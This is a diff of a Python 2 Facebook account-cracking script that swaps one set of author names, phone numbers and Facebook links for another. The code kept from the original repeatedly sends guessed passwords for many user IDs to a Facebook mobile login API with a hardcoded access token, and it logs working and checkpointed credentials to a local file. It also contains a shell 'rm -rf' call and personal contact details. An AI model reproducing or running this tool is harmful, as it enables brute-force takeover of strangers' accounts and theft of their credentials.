@@ -1,4 +1,4 @@
-# Ustad# SIDRA5# Thuglife# Somibro# Gamz#!/usr/bin/python2
+# Ustad# Shadow# Thuglife# gamer# arslan#!/usr/bin/python2
 #coding=utf-8
 import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
 os.system('rm -rf .txt')
@@ -81,15 +81,15 @@ vuln = "\033[92mVuln"
 os.system("clear")
 print  """
 \033[1;92m   ╔0═0╗ ♫♪    
-\033[1;92m   ║ Savage        ║ ♪♪   
-\033[1;92m   ║ Nwabuking ║♫♪  
-\033[1;92m   ║ ◎♫♪♫   [♫] HACKERS LEGION NIGERIA 🇳🇬 [♫]  
+\033[1;92m   ║ CODER        ║ ♪♪   
+\033[1;92m   ║ AFTHZ ║♫♪  
+\033[1;92m   ║ ◎♫♪♫   [♫] LEGEND HACKER DECODER OP [♫]  
 \033[1;92m╔══0═══0═════00o═══════════════════════════╗  
-\033[1;92m█ ✯ AUTHOR   : OKENWA BRIGHT                   █  
-\033[1;92m█ ✯ YOUTUBE  : Technical Okenwa                 █  
-\033[1;92m█ ✯ FACEBOKK : Bright Godphrey                  █  
-\033[1;92m█ ✯ WHATSAPP : +2347061758885             █   
-\033[1;92m█ ✯ GITHUB   : Okenwa24                                 █  
+\033[1;92m█ ✯ AUTHOR   : KASHMIRI HACKER                   █  
+\033[1;92m█ ✯ YOUTUBE  : M.R HACKER                 █  
+\033[1;92m█ ✯ FACEBOKK : coderopprocodervp                  █  
+\033[1;92m█ ✯ WHATSAPP : +0342508*****             █   
+\033[1;92m█ ✯ GITHUB   : shadow                                 █  
 \033[1;92m╚══0═══0═════00o═══════════════════════════╝   
 \033[1;96m--------------------------------------------
 """
@@ -98,34 +98,36 @@ print  """
 
 logo1 = """
 \033[1;92m   ╔0═0╗ ♫♪    
-\033[1;92m   ║ Savage_Fundz║ ♪♪   
-\033[1;92m   ║ Okenwa Bright║♫♪  
-\033[1;92m   ║ ◎♫♪♫   [♫] HACKERS LEGION NIGERIA 🇳🇬 [♫]    
+\033[1;92m   ║ Kashmiri-hacker║ ♪♪   
+\033[1;92m   ║ Okenwa Shadow║♫♪  
+\033[1;92m   ║ ◎♫♪♫   [♫] HACKERS Coder Decoder Op [♫]    
 \033[1;92m╔══0═══0═════00o═══════════════════════════╗  
-\033[1;92m█ ✯ AUTHOR   : Okenwa Bright                         █  
-\033[1;92m█ ✯ YOUTUBE  : Technical Okenwa                 █  
-\033[1;92m█ ✯ FACEBOKK : Bright Godphrey                  █  
-\033[1;92m█ ✯ WHATSAPP : +2347061758885             █   
-\033[1;92m█ ✯ GITHUB   : Okenwa24                                 █  
+\033[1;92m█ ✯ AUTHOR   : shadow hacker                        █  
+\033[1;92m█ ✯ YOUTUBE  : MR.HACKER
+
+                 █  
+\033[1;92m█ ✯ FACEBOKK : Alone coder fucker                  █  
+\033[1;92m█ ✯ WHATSAPP : +034250******00             █   
+\033[1;92m█ ✯ GITHUB   : shadow                                 █  
 \033[1;92m╚══0═══0═════00o═══════════════════════════╝   
 \033[1;96m--------------------------------------------
 """
 logo2 = """
 \033[1;92m   ╔0═0╗ ♫♪    
-\033[1;92m   ║ Okenwa ║ ♪♪   
+\033[1;92m   ║ Shadow ║ ♪♪   
 \033[1;92m   ║ Bright     ║♫♪  
-\033[1;92m   ║ ◎♫♪♫   [♫] HACKERS LEGION NIGERIA 🇳🇬 [♫]  
+\033[1;92m   ║ ◎♫♪♫   [♫] CYBER HACKER 4.2.0  LG[♫]  
 \033[1;92m╔══0═══0═════00o═══════════════════════════╗  
-\033[1;92m█ ✯ AUTHOR   : OKENWA BRIGHT                   █  
-\033[1;92m█ ✯ YOUTUBE  : Technical Okenwa                  █  
-\033[1;92m█ ✯ FACEBOKK : Bright Godphrey                   █  
-\033[1;92m█ ✯ WHATSAPP : +2347061758885              █   
-\033[1;92m█ ✯ GITHUB   : Okenwa24.                                 █  
+\033[1;92m█ ✯ AUTHOR   : KASHMIRI HACKER                   █  
+\033[1;92m█ ✯ YOUTUBE  : MR.HACKER                  █  
+\033[1;92m█ ✯ FACEBOKK : Alone Coder                  █  
+\033[1;92m█ ✯ WHATSAPP : +03467********              █   
+\033[1;92m█ ✯ GITHUB   : shadow.                                 █  
 \033[1;92m╚══0═══0═════00o═══════════════════════════╝   
 \033[1;96m--------------------------------------------
 """
-CorrectUsername = "Okenwa"
-CorrectPassword = "252530"
+CorrectUsername = "afthz"
+CorrectPassword = "afthz"
 
 loop = 'true'
 while (loop == 'true'):
@@ -133,15 +135,15 @@ while (loop == 'true'):
     if (username == CorrectUsername):
     	password = raw_input("\033[1;92m\x1b[1;92mPassword  \x1b[1;92m:\x1b[1;92m")
         if (password == CorrectPassword):
-            print "Logged in successfully as " + username #OkenwaBright
+            print "Logged in successfully as " + username #Kashmiri Hacker
 	    time.sleep(1)
             loop = 'false'
         else:
             print "\033[1;91mWrong Password"
-            os.system('xdg-open https://www.facebook.com/okenwa.24')
+            os.system('xdg-open https://www.facebook.com/100007380942306')
     else:
         print "\033[1;91mWrong Username"
-        os.system('xdg-open https://www.facebook.com/okenwa.24')
+        os.system('xdg-open https://www.facebook.com/100007380942306')
 
 
 
@@ -173,7 +175,7 @@ def Zeek():
     print logo1
     print '\x1b[1;92m[1] START CRACKING'
     time.sleep(0.10)
-    print '\x1b[1;92m[2] Okenwa FB ACCOUNT'
+    print '\x1b[1;92m[2] Shadow FB ACCOUNT'
     time.sleep(0.10)
     print '\x1b[1;92m[3] MORE INFO'
     time.sleep(0.10)
@@ -181,7 +183,7 @@ def Zeek():
     time.sleep(0.10)
     print '\x1b[1;92m[5] CLONING ERROR'
     time.sleep(0.10)
-    print '\x1b[1;92m[6] OKENWA BRIGHT FACEBOOK'
+    print '\x1b[1;92m[6] Shadow hacker FACEBOOK'
     time.sleep(0.10)
     print '\x1b[1;92m[0] back'
    
@@ -232,14 +234,14 @@ def action():
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
             q = json.load(data)
             if 'access_token' in q:
-                print '\x1b[1;92m(OKENWA-OK)  ' + k + c + user + '  |  ' + pass1                                       
+                print '\x1b[1;92m(Shadow-OK)  ' + k + c + user + '  |  ' + pass1                                       
                 okb = open('save/cloned.txt', 'a')
                 okb.write(k+c+user+pass1+'\n')
                 okb.close()
                 oks.append(c+user+pass1)
             else:
                 if 'www.facebook.com' in q['error_msg']:
-                    print '\033[1;91m(OKENWA_CP) ' + k + c + user + '  |  ' + pass1
+                    print '\033[1;91m(Shadow_CP) ' + k + c + user + '  |  ' + pass1
                     cps = open('save/cloned.txt', 'a')
                     cps.write(k+c+user+pass1+'\n')
                     cps.close()
@@ -249,14 +251,14 @@ def action():
                     data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                     q = json.load(data)
                     if 'access_token' in q:
-                        print '\x1b[1;92m(OKENWA-OK)  ' + k + c + user +  '  |  ' + pass2
+                        print '\x1b[1;92m(Shadow_OK)  ' + k + c + user +  '  |  ' + pass2
                         okb = open('save/cloned.txt', 'a')
                         okb.write(k+c+user+pass2+'\n')
                         okb.close()
                         oks.append(c+user+pass2)
                     else:
                         if 'www.facebook.com' in q['error_msg']:
-                            print '\033[1;91m(OKENWA_CP) ' + k + c + user + '  |  ' + pass2
+                            print '\033[1;91m(Shadow_CP) ' + k + c + user + '  |  ' + pass2
                             cps = open('save/cloned.txt', 'a')
                             cps.write(k+c+user+pass2+'\n')
                             cps.close()
@@ -266,14 +268,14 @@ def action():
                             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                             q = json.load(data)
                             if 'access_token' in q:
-                                print '\x1b[1;92m(OKENWA-OK)  ' + k + c + user + '  |  ' + pass3
+                                print '\x1b[1;92m(Shadow-OK)  ' + k + c + user + '  |  ' + pass3
                                 okb = open('save/cloned.txt', 'a')
                                 okb.write(k+c+user+pass3+'\n')
                                 okb.close()
                                 oks.append(c+user+pass3)
                             else:
                                 if 'www.facebook.com' in q['error_msg']:
-                                    print '\033[1;91m(OKENWA_CP) ' + k + c + user + '  |  ' + pass3 
+                                    print '\033[1;91m(Shadow_CP) ' + k + c + user + '  |  ' + pass3 
                                     cps = open('save/cloned.txt', 'a')
                                     cps.write(k+c+user+pass3+'\n')
                                     cps.close()
@@ -283,14 +285,14 @@ def action():
                                     data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                     q = json.load(data)
                                     if 'access_token' in q:
-                                        print '\x1b[1;92m(OKENWA-OK)  ' + k + c + user + '  |  ' + pass4 
+                                        print '\x1b[1;92m(Shadow-OK)  ' + k + c + user + '  |  ' + pass4 
                                         okb = open('save/cloned.txt', 'a')
                                         okb.write(k+c+user+pass4+'\n')
                                         okb.close()
                                         oks.append(c+user+pass4)
                                     else:
                                         if 'www.facebook.com' in q['error_msg']:
-                                            print '\033[1;91m(OKENWA_CP) ' + k + c + user + '  |  ' + pass4
+                                            print '\033[1;91m(Shadow_CP) ' + k + c + user + '  |  ' + pass4
                                             cps = open('save/cloned.txt', 'a')
                                             cps.write(k+c+user+pass4+'\n')
                                             cps.close()
@@ -300,14 +302,14 @@ def action():
                                             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                             q = json.load(data)
                                             if 'access_token' in q:
-                                                print '\x1b[1;92m(OKENWA-OK)  ' + k + c + user + '  |  ' + pass5
+                                                print '\x1b[1;92m(Shadow-OK)  ' + k + c + user + '  |  ' + pass5
                                                 okb = open('save/cloned.txt', 'a')
                                                 okb.write(k+c+user+pass5+'\n')
                                                 okb.close()
                                                 oks.append(c+user+pass5)
                                             else:
                                                 if 'www.facebook.com' in q['error_msg']:
-                                                    print '\033[1;91m(OKENWA_CP) ' + k + c + user + '  |  ' + pass5 
+                                                    print '\033[1;91m(Shadow_CP) ' + k + c + user + '  |  ' + pass5 
                                                     cps = open('save/cloned.txt', 'a')
                                                     cps.write(k+c+user+pass5+'\n')
                                                     cps.close()
@@ -336,20 +338,20 @@ def action():
     print ''
     print """
 \033[1;92m   ╔0═0╗ ♫♪    
-\033[1;92m   ║ SAVAGE     ║ ♪♪   
+\033[1;92m   ║ Shadow     ║ ♪♪   
 \033[1;92m   ║ FACOUREX║♫♪  
-\033[1;92m   ║ ◎♫♪♫   [♫] HACKERS LEGION NIGERIA 🇳🇬[♫]  
+\033[1;92m   ║ ◎♫♪♫   [♫] HACKERS Coder Programmer[♫]  
 \033[1;92m╔══0═══0═════00o═══════════════════════════╗  
-\033[1;92m█ ✯ AUTHOR   : OKENWA BRIGHT                   █  
-\033[1;92m█ ✯ YOUTUBE  : Technical Okenwa                 █  
-\033[1;92m█ ✯ FACEBOKK : Bright Godphrey                  █  
-\033[1;92m█ ✯ WHATSAPP : +2347061758885             █   
-\033[1;92m█ ✯ GITHUB   : Okenwa24.                                █  
+\033[1;92m█ ✯ AUTHOR   : Programmer                   █  
+\033[1;92m█ ✯ YOUTUBE  : M.R HACKER                 █  
+\033[1;92m█ ✯ FACEBOKK : 100007380942306                 █  
+\033[1;92m█ ✯ WHATSAPP : +9372*********             █   
+\033[1;92m█ ✯ GITHUB   : shadow.                                █  
 \033[1;92m╚══0═══0═════00o═══════════════════════════╝   
 \033[1;96m--------------------------------------------
 \033[1;92mThanks For Using This Tool
-\033[1;92mFb\033[1;92mBright Godphrey
-\033[1;92mFacebook Link \033[1;92https://www.facebook.com/okenwa.24"""
+\033[1;92mFb\033[1;92mBright Coding
+\033[1;92mFacebook Link \033[1;92https://www.facebook.com/100007380942306"""
 
     
     raw_input("\n\033[1;92m[\033[1;92mBack\033[1;92m]")
